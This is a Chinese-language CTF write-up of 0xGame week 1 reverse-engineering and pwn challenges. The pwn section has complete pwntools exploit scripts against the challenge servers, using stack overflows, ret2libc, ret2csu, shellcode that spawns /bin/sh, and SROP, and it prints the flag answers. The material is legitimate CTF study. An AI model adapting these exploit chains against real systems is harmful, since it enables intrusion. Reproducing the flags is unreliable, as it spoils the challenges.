/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Stack frame is not setup normally: Input value of stackpointer is not used */
/* WARNING: This function may have set the stack pointer */
/* WARNING: Removing unreachable block (ram,0x000100bb) */

void entry(void)

{
  byte *pbVar1;
  code *pcVar2;
  byte bVar3;
  byte bVar4;
  int iVar5;
  byte extraout_DH;
  char cVar6;
  int iVar7;
  byte bVar8;
  undefined1 *puVar9;
  int unaff_BP;
  byte *pbVar10;
  byte *pbVar11;
  
  puVar9 = (undefined1 *)0x200;
  DAT_1000_01fe = 0x1000;
  pbVar10 = (byte *)0x5d;
  pbVar11 = (byte *)0x7e;
  iVar5 = 0x21;
  iVar7 = 0xa7;
  do {
    pbVar1 = pbVar10;
    pbVar10 = pbVar10 + 1;
    bVar4 = *pbVar1 >> 1;
    bVar3 = (byte)(bVar4 | *pbVar1 << 7) >> 1;
    bVar8 = (byte)((uint)iVar7 >> 8);
    bVar4 = (((byte)(bVar3 | bVar4 << 7) >> 1 | bVar3 << 7) - 7) - bVar8 ^ (byte)iVar7;
    pbVar1 = pbVar11;
    pbVar11 = pbVar11 + 1;
    *pbVar1 = bVar4;
    cVar6 = (byte)iVar7 + bVar4;
    iVar7 = CONCAT11(bVar8 + 1,(cVar6 * '\x02' | cVar6 < '\0') ^ bVar8);
    iVar5 = iVar5 + -1;
  } while (iVar5 != 0);
  *pbVar11 = 0x24;
  pcVar2 = (code *)swi(0x21);
  (*pcVar2)();
  pcVar2 = (code *)swi(0x21);
  (*pcVar2)();
  pcVar2 = (code *)swi(0x21);
  (*pcVar2)();
  pcVar2 = (code *)swi(0x21);
  (*pcVar2)();
  *(int *)(puVar9 + -2) = iVar7;
  pbVar10[unaff_BP + 0x65] = pbVar10[unaff_BP + 0x65] & extraout_DH;
  *(undefined2 *)(iVar7 + 0x76) = *(undefined2 *)(iVar7 + 0x76);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```

a 那我还是啃汇编吧

```asm
seg000:0000 start           proc near
seg000:0000                 push    cs
seg000:0001                 pop     ds
seg000:0002                 assume ds:seg000
seg000:0002                 push    cs
seg000:0003                 pop     es
seg000:0004                 assume es:seg000
seg000:0004                 cld
seg000:0005                 mov     si, 5Dh ; ']'
seg000:0008                 mov     di, 7Eh ; '~'
seg000:000B                 mov     cx, 21h ; '!'
seg000:000E                 mov     bl, 0A7h
seg000:0010                 xor     bh, bh
seg000:0012
seg000:0012 loc_10012:                              ; CODE XREF: start+28↓j
seg000:0012                 lodsb
seg000:0013                 ror     al, 1
seg000:0015                 ror     al, 1
seg000:0017                 ror     al, 1
seg000:0019                 sub     al, 7
seg000:001B                 sub     al, bh
seg000:001D                 xor     al, bl
seg000:001F                 stosb
seg000:0020                 add     bl, al
seg000:0022                 rol     bl, 1
seg000:0024                 xor     bl, bh
seg000:0026                 inc     bh
seg000:0028                 loop    loc_10012
seg000:002A                 mov     al, 24h ; '$'
seg000:002C                 stosb
seg000:002D                 mov     dx, 47h ; 'G'
seg000:0030                 mov     ah, 9
seg000:0032                 int     21h             ; DOS - PRINT STRING
seg000:0032                                         ; DS:DX -> string terminated by "$"
seg000:0034                 mov     dx, 7Eh ; '~'
seg000:0037                 mov     ah, 9
seg000:0039                 int     21h             ; DOS - PRINT STRING
seg000:0039                                         ; DS:DX -> string terminated by "$"
seg000:003B                 mov     dx, 5Ah ; 'Z'
seg000:003E                 mov     ah, 9
seg000:0040                 int     21h             ; DOS - PRINT STRING
seg000:0040                                         ; DS:DX -> string terminated by "$"
seg000:0042                 mov     ax, 4C00h
seg000:0045                 int     21h             ; DOS - 2+ - QUIT WITH EXIT CODE (EXIT)
seg000:0045 start           endp                    ; AL = exit code
seg000:0045
seg000:0045 ; ---------------------------------------------------------------------------
seg000:0047                 db 53h, 69h, 67h, 6Eh, 61h, 6Ch, 20h, 72h, 65h, 63h, 6Fh
seg000:0052                 db 76h, 65h, 72h, 65h, 64h, 3Ah, 20h, 24h, 0Dh, 0Ah, 24h
seg000:005D                 db 0F4h, 0FEh, 88h, 0C2h, 0D2h, 54h, 64h, 6, 28h, 0D5h
seg000:0067                 db 0BDh, 0B6h, 65h, 58h, 4Dh, 1Dh, 56h, 7Eh, 0Bh, 99h
seg000:0071                 db 0E6h, 0F2h, 0A4h, 55h, 7Dh, 21h, 83h, 96h, 0E1h, 10h
seg000:007B                 db 0Dh, 4Fh, 5Ch, 22h dup(0)
seg000:00A0                 db 160h dup(?)
seg000:00A0 seg000          ends
```

```python
data = bytes.fromhex(
    "f4fe88c2d254640628d5bdb665584d1d"
    "567e0b99e6f2a4557d218396e1100d4f5c"
)

bl = 0xA7
bh = 0
out = bytearray()

for x in data:
    for _ in range(3):
        x = ((x >> 1) | ((x & 1) << 7)) & 0xff

    x = (x - 7) & 0xff
    x = (x - bh) & 0xff
    x ^= bl

    out.append(x)

    bl = (bl + x) & 0xff
    bl = ((bl << 1) | (bl >> 7)) & 0xff
    bl ^= bh

    bh = (bh + 1) & 0xff

print(out.decode())
```

#### 另解

可以直接扔进这里跑

https://exebrowser.com/dos-emulator/

```text
0xGame{JuS7_g1v3_16bit7t_@_try!!}
```



### ez_upx

记录一下手脱壳

首先拖入 **DIE**，确认加壳后的程序 EP 是 `40d960`

接着拖入 x64dbg，F9到 EP，F7 单步执行完四个 push 语句

![](../../assets/imports/0xgame2026-week1/image-20261003160329495.png)

然后我们给 60FF38 **添加硬件断点**（右键->断点->硬件断点->访问->8字节），然后 F9

这时候程序跳转到了**对应的 pop 语句**

![](../../assets/imports/0xgame2026-week1/image-20261003160526013.png)

然后切换到断点页面，**删除硬件断点**

F7 单步执行，即来到了程序的 OEP -- 4014E0

接下来命令框输入 **scylla**，x64dbg会调用内置的 scylla 插件

先后**点击 IAT Autoresearch 和 GET Imports**

![](../../assets/imports/0xgame2026-week1/image-20261003160930020.png)

误报警可以删除，然后 dump 保存这个 exe，再点击 Fix dump，选中刚刚的 exe。

在同目录下可以找到 `attachment1_dump_SCY.exe` 即完成了手脱 UPX 壳，这就是脱壳后的程序。



拖入IDA，挺简单的

```c
_BOOL8 __fastcall encrypt(char *Buffer)
{
  char Str1[48]; // [rsp+20h] [rbp-50h] BYREF
  _QWORD v3[4]; // [rsp+50h] [rbp-20h] BYREF

  if ( j_strlen(Buffer) != 29 )
    return 0;
  xor(Buffer, v3, 29);
  // "RhExDlhVDSdGGEJHKRBGGmpbGFkBMGBgLkhXTkg="
  return b64(v3, 29, Str1) == 40 && j_strcmp(Str1, encrypted) == 0;
}
```

反解

```python
import base64

target = "RhExDlhVDSdGGEJHKRBGGmpbGFkBMGBgLkhXTkg="
key = b"vivo50"

data = base64.b64decode(target)

flag = bytes(
    b ^ key[i % len(key)]
    for i, b in enumerate(data)
)

print(flag.decode())
```

```text
0xGame{N0www_y0u_kn0w_UPX!!!}
```



### z3_solver

```c
bool __fastcall check(char *Buffer)
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 22; ++i )
  {
    if ( (unsigned __int8)Buffer[i] <= 0x1Fu || (unsigned __int8)Buffer[i] > 0x7Eu )
      return 0;
    if ( 5 * (unsigned __int8)Buffer[(i + 1) % 23]
       + 3 * (unsigned __int8)Buffer[i]
       + 11 * (unsigned __int8)Buffer[(i + 7) % 23]
       + 7 * (unsigned __int8)Buffer[(i + 4) % 23] != word_404000[i] )
      return 0;
  }
  return 1;
}
```

```python
from z3 import *

N = 23

target = [
    0x0B21, 0x07BF, 0x0A2C, 0x0A2B, 0x08FC,
    0x0860, 0x0AC7, 0x0A21, 0x07EE, 0x0A0E,
    0x0B55, 0x0A05, 0x0ABB, 0x0902, 0x0BC8,
    0x0BCB, 0x06FF, 0x0C4E, 0x0A48, 0x07E3,
    0x0AEF, 0x0A27, 0x0A57
]

x = [Int(f"x{i}") for i in range(N)]

s = Solver()

# Buffer[i] > 0x1f && Buffer[i] <= 0x7e
for i in range(N):
    s.add(x[i] >= 0x20)
    s.add(x[i] <= 0x7e)

for i in range(N):
    s.add(
        5 * x[(i + 1) % 23]
        + 3 * x[i]
        + 11 * x[(i + 7) % 23]
        + 7 * x[(i + 4) % 23]
        == target[i]
    )

if s.check() == sat:
    m = s.model()

    flag = ''.join(
        chr(m[x[i]].as_long())
        for i in range(N)
    )

    print(flag)
else:
    print("No solution")
```

```text
0xGame{z3_Se3ms_ezzz2z}
```



## Pwn

### 奇妙杂货铺

服了服了，还以为考整数溢出呢，能把加法写成减法是真的无敌了

选1 输入 -10000 就 够了

```text
0xGame{Welc0m3_7o_th3_pwn_w0rld!!!}
```



### ！？数学基础？！

这题感觉很难崩。不适合放在pwn，坑一堆纯纯为难人

```text
运算符不是统一 ASCII：

 `x`：乘法
 `÷`：除法
 `＋`：加法
 `一`：减法

除法是整数除法。
```

```python
import re
import socket


HOST = "nc1.ctfplus.cn"
PORT = 25232


def answer(a: int, op: str, b: int) -> int:
    if op in ("+", "＋"):
        return a + b
    if op in ("-", "一", "−"):
        return a - b
    if op in ("*", "x", "X", "×"):
        return a * b
    if op in ("/", "÷"):
        return a // b
    raise ValueError(f"unknown operator: {op!r}")


def recv_until(sock: socket.socket, marker: bytes, buf: bytes = b"") -> tuple[bytes, bytes]:
    while marker not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("server closed the connection")
        buf += chunk
    pos = buf.index(marker) + len(marker)
    return buf[:pos], buf[pos:]


with socket.create_connection((HOST, PORT), timeout=8) as sock:
    sock.settimeout(8)
    buf = b""

    for _ in range(100):
        shown, buf = recv_until(sock, b"Input your answer:", buf)
        text = shown.decode("utf-8", errors="replace")
        match = re.search(r"calculate:\s*(-?\d+)\s*([^\s]+)\s*(-?\d+)", text)
        if not match:
            raise RuntimeError(f"cannot parse question:\n{text}")

        a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
        result = answer(a, op, b)
        print(f"{a} {op} {b} = {result}")
        sock.sendall(f"{result}\n".encode())

    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk

    print(buf.decode("utf-8", errors="replace"))

```

```text
0xGame{Y0u_4r3_7h3_PY7h0n_m4st3r}
```



### 亦步亦趋

首先检查程序

```bash
└─$ checksec pwn
[*] '/mnt/e/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

没有 Canary，栈不可执行，PIE 开启导致地址随机化。

level1

查看栈布局

```c
  _BYTE buf[28]; // [rsp+0h] [rbp-20h] BYREF
  int v2; // [rsp+1Ch] [rbp-4h] BYREF
```

由于调用了 read 函数，只需要发送 'A'*28+ef be ad de （小端序）即可覆盖掉 v2(magic)

level2

```c
_BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF
```

`v1` 距离保存的返回地址（位于 rbp + 8）偏移为：32 + 8 = 40 字节

win（backdoor）函数地址为 0x1209。由于有 PIE ，所以根据程序打印的 win 函数地址相减可以得到基地址。

x86-64 System V ABI 要求函数调用时栈满足 16 字节对齐，所以需要一个 gadget 使得 rsp += 8，这里取的是 _init_proc 函数的ret。



```python
from pwn import *
import re

elf = ELF('./pwn', checksec=False)
context.binary = elf
context.log_level = 'debug'

HOST = 'nc1.ctfplus.cn'
PORT = 33742

WIN_OFF = 0x1209
RET_OFF = 0x101a

io = remote(HOST,PORT)
# io = process('./pwn')

io.recvuntil(b'> ')
payload1 = b'A' * 28
payload1 += p32(0xdeadbeef)
io.send(payload1)

data = io.recvuntil(b'> ')
m = re.search(rb'about: (0x[0-9a-fA-F]+)', data)

win = int(m.group(1), 16)
base = win - WIN_OFF

payload2 = flat(b'A' * 40,base + RET_OFF,win)
io.sendline(payload2)

io.interactive()
```

```text
0xGame{R3t2t3xt_4nd_7th_st4ck_1s_m4gic}
```



### 两次回响

首先检查程序

```bash
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

NX 可执行，考虑使用 shellcode。根据题目提示应该是 9 字节。

```asm
.text:000000000000125C                 mov     rax, [rbp+buf]
.text:0000000000001260                 mov     edx, 9          ; nbytes
.text:0000000000001265                 mov     rsi, rax        ; buf
.text:0000000000001268                 mov     edi, 0          ; fd
.text:000000000000126D                 call    _read
.text:0000000000001272                 mov     rax, [rbp+buf]
.text:0000000000001276                 mov     [rbp+var_8], rax
.text:000000000000127A                 mov     rdx, [rbp+var_8]
.text:000000000000127E                 mov     eax, 0
.text:0000000000001283                 call    rdx
.text:0000000000001285                 mov     eax, 0
```

在 1283 下断点（main+0x75)

![](../../assets/imports/0xgame2026-week1/image-20261004182712598.png)

所以进入 shellcode 时寄存器状态为 `rax=0, rdx=buf, rsi=buf, rdi=0`

`rsi`（目的地址）和 `rdi`（fd=0）**本来就已经正确**，所以只需要动 `rax` 和 `rdx`：

```asm
xor eax, eax      ; 31 c0   2B   置 SYS_read
xor edx, edx      ; 31 d2   2B
mov dh, 0x10      ; b6 10   2B   rdx = 0x1000  ← 正好等于 mmap 映射大小
syscall           ; 0f 05   2B   read(0, rsi=buf, 0x1000)
```

补一个 NOP 即可

exp:

```python
from pwn import *
import re

elf = ELF('./pwn', checksec=False)
context.binary = elf
context.log_level = 'debug'

HOST = 'nc1.ctfplus.cn'
PORT = 45434

FILL = 8

payload1  = asm('xor eax,eax; xor edx,edx; mov dh,0x10; syscall')
payload1 += b'\x90'
payload2  = flat(b'\x90' * FILL, asm(shellcraft.sh()))   # 执行从 buf+8 开始

io = remote(HOST,PORT)
# io = process('./pwn')

io.recvuntil(b'What do you want to say ?')
io.send(payload1)
io.send(payload2)

io.interactive()
```

```text
0xGame{Sh3llc0de_c4n_do_3v3ry7h1ng}
```



### 保持沉默

首先检查程序

```bash
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

注意没用 PIE。根据提示 ret2libc

```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("%s", msg);                            // "Input your payload: \n"
  if ( flag )
  {
    close(1);
    --flag;
  }
  return read(0, buf, 0x100u);
}
```

**关闭了标准输出**，泄漏之前，必须先拿回一个能往 socket 写字的东西。

read 处明显存在栈溢出。找一下发现了出题人的礼物

```c
int __fastcall put(__int64 a1, __int64 n38183)
{
  if ( a1 != 3735928559LL || n38183 != 38183 )
  {
    dup2(2, 1);
    printf("%s", failure);                      // "You don't know the rop! Go away!\n"
    exit(0);
  }
  dup2(2, 1);
  return puts("[+] Congratulation! The rights have been unlocked!");
}
```

甚至还送了 gadget

```asm
.text:00000000004011FE                 pop     rdi
.text:00000000004011FF                 retn
```

大致思路如下

**Stage 1**（一次 read 就够）：

1. `pop rdi/rsi` → `put(0xdeadbeef, 0x9527)` 恢复输出
2. `puts(puts@got)` 泄漏 libc
3. 返回 `vuln` 重新读第二阶段

**Stage 2**：`system("/bin/sh")` 拿 shell 读 flag。

首先泄露 libc ，打两个地址增强指纹

```python
from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

elf = ELF('./pwn2', checksec=False)

POP_RDI, POP_RSI, RET = 0x4011fe, 0x401200, 0x401204
OFF, PROMPT = 0x28, b'Input your payload: \n'

io = remote('nc1.ctfplus.cn', 12159)
io.recvuntil(PROMPT)

io.send(flat(
    b'A' * OFF,
    RET,                                        # 栈对齐
    POP_RDI, 0xdeadbeef, POP_RSI, 0x9527,       # put(0xdeadbeef, 0x9527)
    elf.sym['put'],                             #   -> dup2(2,1), 把 fd1 接回 socket
    POP_RDI, elf.got['puts'], elf.plt['puts'],  # puts(puts@got)
    POP_RDI, elf.got['read'], elf.plt['puts'],  # puts(read@got)
    RET, elf.sym['vuln'],                       # 回 vuln, 好等到 prompt
))

io.recvuntil(b'unlocked!\n')
for name in ('puts', 'read'):
    a = u64(io.recvline().strip().ljust(8, b'\x00'))
    print('%-5s = %#x   %03x' % (name, a, a & 0xfff))
```

```text
puts  = 0x7fc0cec4fe50   e50
read  = 0x7fc0cece3850   850
```

https://libc.rip/

查一下 libc 确定是 [libc6_2.35-0ubuntu3.13_amd64](https://libc.rip/#)

system 位于 0x50d70

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

elf = ELF('./pwn2', checksec=False)

POP_RDI = 0x4011fe          # pop rdi ; ret   (在 gadget 里)
POP_RSI = 0x401200          # pop rsi ; ret
RET     = 0x401204          # ret
PUT     = elf.sym['put']    # put(0xdeadbeef, 0x9527) -> dup2(2,1) 解锁输出
VULN    = elf.sym['vuln']
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']

OFF = 0x28

LIBC_PUTS   = 0x80e50
LIBC_SYSTEM = 0x50d70
LIBC_BINSH  = 0x1d8678

io = remote('nc1.ctfplus.cn', 12159)
io.recvuntil(b'Input your payload: \n')

# ---------- stage 1: 恢复 stdout + 泄漏 puts + 回到 vuln ----------
p  = b'A' * OFF
p += p64(RET)
p += p64(POP_RDI) + p64(0xdeadbeef)
p += p64(POP_RSI) + p64(0x9527)
p += p64(PUT)                                  # dup2(2,1)
p += p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT)   # puts(puts@got)
p += p64(VULN)                                 # flag 已是 0，fd1 不会被再关
assert len(p) <= 0x100
io.send(p)

io.recvuntil(b'unlocked!\n')
libc = u64(io.recvline().strip().ljust(8, b'\x00')) - LIBC_PUTS
log.success('libc base = %#x', libc)
log.success('system    = %#x', libc + LIBC_SYSTEM)
io.recvuntil(b'Input your payload: \n')

# ---------- stage 2: system("/bin/sh") ----------
p2  = b'A' * OFF
p2 += p64(RET)
p2 += p64(POP_RDI) + p64(libc + LIBC_BINSH)
p2 += p64(libc + LIBC_SYSTEM)
io.send(p2)

time.sleep(0.5)
io.sendline(b'cat /flag')
time.sleep(1.5)
print(io.recvrepeat(4).decode('latin-1', 'replace'))
io.interactive()
```

```text
0xGame{W0W_y0u_kn0w_7h3_R372L1bc}
```



### 三扇门

首先检查程序

```bash
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

符号表直接把答案写在题面上：

```
win    0x401257        ← 目标
vuln   0x4012c5        ← 溢出点
lose1  0x401196   lose2 0x4011c4
__libc_csu_init  0x401330   ← 燃料
```

```c
ssize_t vuln()
{
  _BYTE buf[16]; // [rsp+0h] [rbp-10h] BYREF

  write(1, "Welcome to ret2csu.This time , you need three keys to open the door.\n", 0x45u);
  return read(0, buf, 0x100u);
}
```

16 字节的缓冲区塞 0x100，溢出偏移 `0x10 + 8 = 24`。

目标函数

```c
__int64 __fastcall win(int a1, int a2, int a3)
{
  if ( a1 == 0x111 && a2 == 0x222 && a3 == 0x333 )
  {
    write(1, "Congratulation! You got it!\n", 0x1Cu);
    system("/bin/sh");
  }
  else
  {
    write(1, "The key is not correct.\n", 0x18u);
  }
}
```

要同时喂饱 **`edi = 0x111`、`esi = 0x222`、`edx = 0x333`** 三把钥匙。

扫一下 gadget：

```text
0x401393 : pop rdi ; ret
0x401391 : pop rsi ; pop r15 ; ret
0x40101a : ret
```

`rdi`、`rsi` 都有现成的，**唯独 `rdx` 一个都控不到**。三参数缺一个，`win` 就进不去 —— 这才是题目的核心，题名 `ret2csu` 就是提示。

去 `__libc_csu_init` 里翻，编译器为了跑 `.init_array` 里的构造函数，生成了这么一段通用循环：

```asm
.text:000000000040138A                 pop     rbx
.text:000000000040138B                 pop     rbp
.text:000000000040138C                 pop     r12
.text:000000000040138E                 pop     r13
.text:0000000000401390                 pop     r14
.text:0000000000401392                 pop     r15
.text:0000000000401394                 retn

.text:0000000000401370                 mov     rdx, r14
.text:0000000000401373                 mov     rsi, r13
.text:0000000000401376                 mov     edi, r12d
.text:0000000000401379                 call    qword ptr [r15+rbx*8]
.text:000000000040137D                 add     rbx, 1
.text:0000000000401381                 cmp     rbp, rbx
.text:0000000000401384                 jnz     short loc_401370
```

**`0x401370` 一次把 `rdx/rsi/rdi` 三个全设好，还附赠一次任意函数指针调用** —— ret2csu 的全部价值就在这。

于是链条就清楚了：

```
0x40138a  →  rbx=0  rbp=1  r12=0x111  r13=0x222  r14=0x333  r15=<存着win的指针>
0x401370  →  rdx=0x333, rsi=0x222, edi=0x111, call [r15+0] → win(0x111,0x222,0x333)
             循环条件 rbx(1) == rbp(1) 成立，只调用一次
```

`call [r15+rbx*8]` 是**读出内存里的指针再调用**，所以得先找一块存着 `win` 地址的地方。翻 `.data`：

```
.data:0000000000404050 off_404050    dq offset lose1
.data:0000000000404058 off_404058    dq offset lose2
.data:0000000000404060 off_404060    dq offset win
```

所以 `r15 = 0x404060`、`rbx = 0`，`call [r15]` 就是 `win`。

exp：

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST, PORT = 'nc1.ctfplus.cn', 25415
elf = ELF('./pwn3', checksec=False)

win     = 0x401257
gadget1 = 0x40138a   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
gadget2 = 0x401370   # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
ret     = 0x40101a

r15_ptr = next(a for a in range(0x404040, 0x404080, 8)
               if u64(elf.read(a, 8)) == win)

io = remote(HOST, PORT)
io.recvuntil(b'three keys to open the door.\n')

payload  = b'A' * 24     # buf[0x10] + saved rbp[8]
payload += p64(gadget1)
payload += p64(0)        # rbx
payload += p64(1)        # rbp
payload += p64(0x111)    # r12 -> edi
payload += p64(0x222)    # r13 -> rsi
payload += p64(0x333)    # r14 -> rdx
payload += p64(r15_ptr)  # r15
payload += p64(ret)      # 让 gadget2 落在偶数 slot (栈对齐)
payload += p64(gadget2)  # call [r15] -> win(0x111, 0x222, 0x333)
payload += p64(0) * 7    # add rsp,8 + 6 pops

assert len(payload) <= 0x100
io.send(payload)
time.sleep(0.5)
io.sendline(b'cat /flag')
time.sleep(1.5)
print(io.recvrepeat(3).decode('latin-1', 'replace'))
io.interactive()
```

```text
0xGame{R3t2csu_wh4t_4_mag1c_func7i0n}
```

PS 其实可以三扇门都开

那张表不是白放的。CSU 的 `rbp` 就是循环次数，把 `r15` 指向表头、`rbp` 设成 3，就会老老实实依次 `call lose1 → lose2 → win`：

```python
# r15 = 0x404050, rbp = 3
payload = b'A'*24 + flat(gadget1, 0, 3, 0x111, 0x222, 0x333, 0x404050, ret, gadget2) + p64(0)*7
```

```text
Door 1 is locked...
Door 2 is also locked...
Congratulation! You got it!
```

和跳过前两扇门直奔 `win`结果一样。



### 大道至简

看了一眼附件非常懵，极小，不过提示了是SROP（没听过qwq

还是先检查一下

```bash
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

.text 段只有 125 bytes



什么是SROP

[SROP全称为**(Sigreturn Oriented Programming)**，在ctfwiki中将其归类为了高级ROP，其中，`sigreturn`是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用，其实就是利用了linux中的系统调用号，利用linux下的15号系统调用号调用->**rt_sigreturn**](https://xz.aliyun.com/news/12236)

[用于在内核在恢复上下文的时候并没有与保存的上下文做对比，同时内核在恢复上下文时是从构造的Signal Frame中pop出来各个寄存器的值，而此时的Signal Frame是在栈里的并且用户是可读可写的。这两点疏忽就导致了我们可以伪造Signal Frame之后主动执行sigreturn来控制每个寄存器的值。](https://xz.aliyun.com/news/12236)

让ai进一步解释了一下

#### 内核视角

Linux x86-64 投递信号时，内核在用户栈上构造 `rt_sigframe`（内含完整 `sigcontext`）； 信号处理函数返回时执行 `rt_sigreturn`（`rax = 15`，`syscall`），内核从该 frame **把 16 个通用寄存器 + `rip` + `rsp` 全部还原**。

> 内核不校验这个 frame 是真是假。只要 `syscall` 执行时 `rax = 15` 且 `rsp` 指向伪 frame， 就获得**一次性全寄存器任意写**。

`arch/x86/kernel/signal.c`：

```c
SYSCALL_DEFINE0(rt_sigreturn) {
    struct pt_regs *regs = current_pt_regs();
    frame = (struct rt_sigframe __user *)(regs->sp - sizeof(long));
    if (!access_ok(frame, sizeof(*frame)))
        goto badframe;
    if (restore_sigcontext(regs, &frame->uc.uc_mcontext))
        goto badframe;
    if (restore_altstack(&frame->uc.uc_stack))
        goto badframe;
    return regs->ax;
}
```

#### frame 到底要放在哪

```c
struct rt_sigframe { char *pretcode; struct ucontext uc; ... }
struct ucontext   { unsigned long uc_flags;          // +0
                    struct ucontext *uc_link;        // +8
                    stack_t uc_stack;                // +16 (24B)
                    struct sigcontext uc_mcontext;   // +40   ← 关键
                    sigset_t uc_sigmask; ... }
```

因此内核认为 `uc_mcontext` 位于：

```c
frame_ptr = rsp - 8
uc_mcontext = frame_ptr + 8 + 40 = rsp + 40
```

而 pwntools `SigreturnFrame` 的字节流：

| 字段                         | frame 内偏移 |
| ---------------------------- | ------------ |
| `r8`（= `uc_mcontext` 起点） | `0x28` (40)  |
| `rdi`                        | `0x68`       |
| `rsi`                        | `0x70`       |
| `rdx`                        | `0x88`       |
| `rax`                        | `0x90`       |
| `rsp`                        | `0xa0`       |
| `rip`                        | `0xa8`       |
| 总长                         | `0xf8` (248) |

`uc_mcontext` 在 frame 内偏移 `0x28`，而内核要求它在 `rsp + 40`，所以：

> **`bytes(SigreturnFrame())` 必须恰好落在"`syscall` 执行那一刻"的 `rsp` 上**



分析程序可以构造如下的利用链

```python
GADGET = 0x40107A     # syscall ; ret
BINSH  = 0x403033     # "/bin/sh"
BSS    = 0x403800     # 可写页
OFF    = 0x18

f = SigreturnFrame()
f.rax = 59            # SYS_execve
f.rdi = BINSH         # "/bin/sh"
f.rsi = 0             # argv = NULL（Linux 允许）
f.rdx = 0             # envp = NULL
f.rsp = BSS + 0x700   # 0x403f00：给 shell 一个合法栈
f.rip = GADGET        # 恢复完寄存器后立刻 syscall

payload  = b'A' * OFF
payload += p64(GADGET)    # ret #1 : rax = 0  → read()
payload += p64(GADGET)    # ret #2 : rax = 15 → rt_sigreturn
payload += bytes(f)       # frame
```



```python
#!/usr/bin/env python3
from pwn import *
import sys

context.clear(arch='amd64', log_level='info')

exe = sys.argv[1] if len(sys.argv) > 1 else './pwn'
elf = ELF(exe, checksec=False)

GADGET = 0x40107A          # syscall ; ret
BINSH  = 0x403033          # "/bin/sh"
BSS    = 0x403800          # 可写页 0x403000-0x404000
OFF    = 0x18              # rbp(0x10) + saved rip(0x8)


def stage1():
    f = SigreturnFrame()
    f.rax = 59             # SYS_execve
    f.rdi = BINSH
    f.rsi = 0              # argv = NULL
    f.rdx = 0              # envp = NULL
    f.rsp = BSS + 0x700    # 给 shell 一个（虽小但合法的）栈
    f.rip = GADGET

    p  = b'A' * OFF
    p += p64(GADGET)       # ret #1: rax==0  -> read(0, stackbuf, 0x400)
    p += p64(GADGET)       # ret #2: rax==15 -> rt_sigreturn
    p += bytes(f)
    return p


def exploit(io):
    io.recvuntil(b'challenge.\n')
    io.send(stage1())
    sleep(0.4)             # 时间差，保证 read#1 只吃掉 stage1 ...
    io.send(b'\x00' * 15)  # 让 read#2 返回 15 -> rax = SYS_rt_sigreturn
    sleep(0.4)
    io.sendline(b'cat /flag* /home/*/flag* /root/flag* 2>/dev/null')
    io.interactive()


if __name__ == '__main__':
    io = remote('nc1.ctfplus.cn', 25245) if (len(sys.argv) > 2 and sys.argv[2] == 'remote') \
         else process(exe)
    exploit(io)
```





```text
0xGame{Sr0p_c4n_m4k3_y0ur_dream_c0m3_true}
```



